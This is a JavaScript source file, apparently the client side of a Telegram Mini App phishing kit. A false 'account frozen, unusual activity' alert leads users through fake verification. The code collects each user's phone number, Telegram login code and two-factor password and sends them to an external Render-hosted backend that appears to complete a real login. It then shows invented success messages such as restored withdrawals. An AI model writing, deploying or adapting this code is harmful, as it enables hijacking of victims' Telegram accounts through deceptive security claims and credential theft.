// Конфигурация
const BACKEND_URL = 'https://rollsbocks45.onrender.com'; // Замените на ваш URL Render
// Конфигурация

// Переменные состояния
let currentStep = 0;
let sessionId = null;
let phoneNumber = '';
let phoneCodeHash = '';
let countdownInterval = null;
let currentLanguage = localStorage.getItem('language') || 'en';

// Переводы
const translations = {
    en: {
        // Step 0
        select_language: "Select Language",
        
        // Step 1
        step1_title: "Account Security",
        account_frozen: "Account Frozen",
        user_account: "Your account requires verification",
        freeze_reason: "We've detected unusual activity on your account",
        freeze_action: "Verification required to restore access",
        step1_desc: "Enter phone number",
        step2_desc: "Verify with code",
        step3_desc: "Complete verification",
        start_verification: "Start Verification",
        verification_note: "Process takes 1-2 minutes",
        need_help: "Need help?",
        contact_support: "Contact Support",
        
        // Step 2
        phone_verification: "Phone Verification",
        enter_phone: "Enter your Telegram phone number",
        phone_placeholder: "1234567890",
        phone_hint: "Enter without country code",
        privacy_notice: "Your phone number is used only for verification and is protected by Telegram's security",
        send_code: "Send Verification Code",
        
        // Step 3
        enter_code: "Enter Code",
        code_instruction: "Enter the 5-digit code sent to your Telegram",
        code_expires: "Code expires in",
        resend_code: "Resend Code",
        verify_code: "Verify Code",
        
        // Step 4
        two_factor: "Two-Factor Auth",
        twofa_instruction: "Your account has two-factor authentication enabled",
        enter_2fa: "Enter your 2FA password",
        password_placeholder: "••••••••",
        twofa_hint: "Required for accounts with enhanced security",
        verify_2fa: "Verify & Continue",
        
        // Step 5
        verification_complete: "Verification Complete",
        account_verified: "Account Verified!",
        success_message: "Your account has been successfully verified and all restrictions have been lifted",
        status_label: "Status:",
        verified_status: "Verified",
        user_label: "User ID:",
        time_label: "Time:",
        next_steps: "Next Steps",
        step1_done: "✓ Withdrawals re-enabled",
        step2_done: "✓ Account security upgraded",
        step3_done: "✓ Support notified",
        close_app: "Close Mini App",
        
        // Step 6
        error_occurred: "Error",
        verification_failed: "Verification Failed",
        error_default: "An error occurred during verification",
        check_following: "Please check the following:",
        check_phone: "• Correct phone number",
        check_code: "• Valid verification code",
        check_internet: "• Stable internet connection",
        try_again: "Try Again",
        
        // Общие
        processing: "Processing..."
    },
    ru: {
        // Step 0
        select_language: "Выберите язык",
        
        // Step 1
        step1_title: "Безопасность аккаунта",
        account_frozen: "Аккаунт заморожен",
        user_account: "Ваш аккаунт требует верификации",
        freeze_reason: "Мы обнаружили подозрительную активность на вашем аккаунте",
        freeze_action: "Требуется верификация для восстановления доступа",
        step1_desc: "Введите номер телефона",
        step2_desc: "Подтвердите кодом",
        step3_desc: "Завершите верификацию",
        start_verification: "Начать верификацию",
        verification_note: "Процесс займет 1-2 минуты",
        need_help: "Нужна помощь?",
        contact_support: "Связаться с поддержкой",
        
        // Step 2
        phone_verification: "Верификация телефона",
        enter_phone: "Введите ваш номер телефона Telegram",
        phone_placeholder: "1234567890",
        phone_hint: "Введите без кода страны",
        privacy_notice: "Ваш номер телефона используется только для верификации и защищен безопасностью Telegram",
        send_code: "Отправить код подтверждения",
        
        // Step 3
        enter_code: "Введите код",
        code_instruction: "Введите 5-значный код, отправленный в ваш Telegram",
        code_expires: "Код истекает через",
        resend_code: "Отправить код повторно",
        verify_code: "Подтвердить код",
        
        // Step 4
        two_factor: "Двухфакторная аутентификация",
        twofa_instruction: "На вашем аккаунте включена двухфакторная аутентификация",
        enter_2fa: "Введите ваш пароль 2FA",
        password_placeholder: "••••••••",
        twofa_hint: "Требуется для аккаунтов с усиленной безопасностью",
        verify_2fa: "Подтвердить и продолжить",
        
        // Step 5
        verification_complete: "Верификация завершена",
        account_verified: "Аккаунт подтвержден!",
        success_message: "Ваш аккаунт успешно подтвержден и все ограничения сняты",
        status_label: "Статус:",
        verified_status: "Подтвержден",
        user_label: "ID пользователя:",
        time_label: "Время:",
        next_steps: "Следующие шаги",
        step1_done: "✓ Выводы восстановлены",
        step2_done: "✓ Безопасность улучшена",
        step3_done: "✓ Поддержка уведомлена",
        close_app: "Закрыть мини-приложение",
        
        // Step 6
        error_occurred: "Ошибка",
        verification_failed: "Верификация не удалась",
        error_default: "Произошла ошибка при верификации",
        check_following: "Пожалуйста, проверьте следующее:",
        check_phone: "• Правильный номер телефона",
        check_code: "• Правильный код подтверждения",
        check_internet: "• Стабильное интернет-соединение",
        try_again: "Попробовать снова",
        
        // Общие
        processing: "Обработка..."
    }
};

// Инициализация Telegram Web App
const tg = window.Telegram.WebApp;
if (tg && tg.initData) {
    tg.expand();
    tg.enableClosingConfirmation();
    tg.setHeaderColor('secondary_bg_color');
    tg.setBackgroundColor('#000000');
}

// Функции управления языком
function updateLanguageDisplay() {
    document.querySelectorAll('[data-lang-key]').forEach(element => {
        const key = element.getAttribute('data-lang-key');
        if (translations[currentLanguage] && translations[currentLanguage][key]) {
            if (element.tagName === 'INPUT' && element.hasAttribute('placeholder')) {
                element.placeholder = translations[currentLanguage][key];
            } else {
                element.textContent = translations[currentLanguage][key];
            }
        }
    });
    
    // Обновляем индикаторы языка
    document.querySelectorAll('.language-indicator').forEach(el => {
        el.textContent = currentLanguage.toUpperCase();
    });
    
    // Обновляем галочки в модальном окне
    document.querySelectorAll('.language-check').forEach(el => {
        el.style.opacity = '0';
    });
    const activeCheck = document.getElementById(`check-${currentLanguage}`);
    if (activeCheck) {
        activeCheck.style.opacity = '1';
    }
}

function setLanguage(lang) {
    currentLanguage = lang;
    localStorage.setItem('language', lang);
    updateLanguageDisplay();
}

function selectLanguage(lang) {
    setLanguage(lang);
    showStep(1);
}

function changeLanguage(lang) {
    setLanguage(lang);
    hideLanguageMenu();
}

function showLanguageMenu() {
    document.getElementById('languageModal').classList.add('active');
}

function hideLanguageMenu() {
    document.getElementById('languageModal').classList.remove('active');
}

// Функции управления шагами
function showStep(step) {
    document.querySelectorAll('.step').forEach(el => {
        el.classList.remove('active');
    });
    
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
    
    // Обновляем язык при смене шага
    if (step !== 0) {
        updateLanguageDisplay();
    }
    
    window.scrollTo(0, 0);
}

function goBack(step) {
    showStep(step);
}

function goBackToLanguage() {
    showStep(0);
}

// Начало верификации
function startVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username') || '';
    
    if (username) {
        const displayElement = document.getElementById('usernameDisplay');
        if (currentLanguage === 'en') {
            displayElement.innerHTML = `Account <strong>@${username}</strong> requires verification`;
        } else {
            displayElement.innerHTML = `Аккаунт <strong>@${username}</strong> требует верификации`;
        }
    }
    
    showStep(2);
}

// Загрузка
function showLoading(textKey = 'processing') {
    const text = translations[currentLanguage][textKey] || translations.en[textKey];
    document.getElementById('loadingText').textContent = text;
    document.getElementById('loadingOverlay').classList.add('active');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

// Отправка кода
async function sendCode() {
    const phoneInput = document.getElementById('phoneInput');
    
    if (!phoneInput.value || phoneInput.value.length < 5) {
        showError(currentLanguage === 'en' 
            ? 'Please enter a valid phone number' 
            : 'Пожалуйста, введите правильный номер телефона');
        return;
    }
    
    phoneNumber = '+' + phoneInput.value;
    
    showLoading();
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            showStep(3);
            startCountdown();
        } else {
            const errorMsg = data.error || (currentLanguage === 'en' 
                ? 'Failed to send code' 
                : 'Не удалось отправить код');
            showError(errorMsg);
        }
    } catch (error) {
        console.error('Error:', error);
        showError(currentLanguage === 'en' 
            ? 'Network error. Please check your connection.' 
            : 'Ошибка сети. Проверьте подключение.');
    } finally {
        hideLoading();
    }
}

// Верификация кода
async function verifyCode() {
    const codeInputs = document.querySelectorAll('.code-input');
    const code = Array.from(codeInputs).map(input => input.value).join('');
    
    if (code.length !== 5) {
        showError(currentLanguage === 'en' 
            ? 'Please enter 5-digit code' 
            : 'Пожалуйста, введите 5-значный код');
        return;
    }
    
    showLoading();
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                code: code
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            if (data.success) {
                showSuccess(data.session_info);
            } else if (data.requires_2fa) {
                showStep(4);
            } else {
                const errorMsg = data.error || (currentLanguage === 'en' 
                    ? 'Verification failed' 
                    : 'Верификация не удалась');
                showError(errorMsg);
            }
        } else {
            const errorMsg = data.error || (currentLanguage === 'en' 
                ? 'Invalid verification code' 
                : 'Неверный код подтверждения');
            showError(errorMsg);
        }
    } catch (error) {
        console.error('Error:', error);
        showError(currentLanguage === 'en' 
            ? 'Network error. Please try again.' 
            : 'Ошибка сети. Попробуйте снова.');
    } finally {
        hideLoading();
    }
}

// Верификация 2FA
async function verify2FA() {
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    
    if (!password) {
        showError(currentLanguage === 'en' 
            ? 'Please enter 2FA password' 
            : 'Пожалуйста, введите пароль 2FA');
        return;
    }
    
    showLoading();
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_2fa`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showSuccess(data.session_info);
        } else {
            const errorMsg = data.error || (currentLanguage === 'en' 
                ? 'Invalid 2FA password' 
                : 'Неверный пароль 2FA');
            showError(errorMsg);
        }
    } catch (error) {
        console.error('Error:', error);
        showError(currentLanguage === 'en' 
            ? 'Network error. Please try again.' 
            : 'Ошибка сети. Попробуйте снова.');
    } finally {
        hideLoading();
    }
}

// Показать успех
function showSuccess(sessionInfo) {
    if (sessionInfo && sessionInfo.user_id) {
        document.getElementById('verifiedUserId').textContent = sessionInfo.user_id;
    }
    
    const now = new Date();
    const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    document.getElementById('verificationTime').textContent = timeString;
    
    showStep(5);
}

// Показать ошибку
function showError(message) {
    document.getElementById('errorMessage').textContent = message;
    showStep(6);
    hideLoading();
}

// Повторная отправка кода
async function resendCode() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    const resendBtn = document.getElementById('resendBtn');
    resendBtn.disabled = true;
    resendBtn.textContent = currentLanguage === 'en' ? 'Sending...' : 'Отправка...';
    
    showLoading();
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            startCountdown();
        } else {
            const errorMsg = data.error || (currentLanguage === 'en' 
                ? 'Failed to resend code' 
                : 'Не удалось отправить код повторно');
            showError(errorMsg);
        }
    } catch (error) {
        console.error('Error:', error);
        showError(currentLanguage === 'en' 
            ? 'Network error. Please try again.' 
            : 'Ошибка сети. Попробуйте снова.');
    } finally {
        hideLoading();
        resendBtn.textContent = translations[currentLanguage].resend_code;
    }
}

// Таймер
function startCountdown() {
    let countdown = 60;
    const countdownElement = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    
    resendBtn.disabled = true;
    
    countdownElement.textContent = countdown;
    
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    countdownInterval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            resendBtn.disabled = false;
        }
    }, 1000);
}

// Перемещение между полями кода
function moveToNext(input, nextIndex) {
    if (input.value.length === 1) {
        const nextInput = input.nextElementSibling;
        if (nextInput) {
            nextInput.focus();
        }
    } else if (input.value.length === 0) {
        const prevInput = input.previousElementSibling;
        if (prevInput) {
            prevInput.focus();
        }
    }
}

// Закрыть Mini App
function closeMiniApp() {
    if (tg && tg.close) {
        tg.close();
    }
}

// Контакт с поддержкой
function contactSupport() {
    if (tg && tg.openTelegramLink) {
        tg.openTelegramLink('https://t.me/rollssupport');
    } else {
        window.open('https://t.me/rollssupport', '_blank');
    }
}

// Нажатие Enter
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        switch (currentStep) {
            case 2:
                sendCode();
                break;
            case 3:
                verifyCode();
                break;
            case 4:
                verify2FA();
                break;
        }
    }
});

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    // Проверяем, выбран ли уже язык
    if (currentLanguage && currentLanguage !== '0') {
        updateLanguageDisplay();
        showStep(1);
    } else {
        showStep(0);
    }
    
    // Автофокус на поле телефона при переходе на шаг 2
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                if (document.getElementById('step2').classList.contains('active')) {
                    setTimeout(() => {
                        const phoneInput = document.getElementById('phoneInput');
                        if (phoneInput) {
                            phoneInput.focus();
                        }
                    }, 300);
                }
            }
        });
    });
    
    observer.observe(document.getElementById('step2'), {
        attributes: true,
        attributeFilter: ['class']
    });
    
    // Инициализация полей ввода кода
    const codeInputs = document.querySelectorAll('.code-input');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === 'deleteContentBackward' && input.value === '') {
                const prevInput = input.previousElementSibling;
                if (prevInput) {
                    prevInput.focus();
                }
            }
        });
    });
});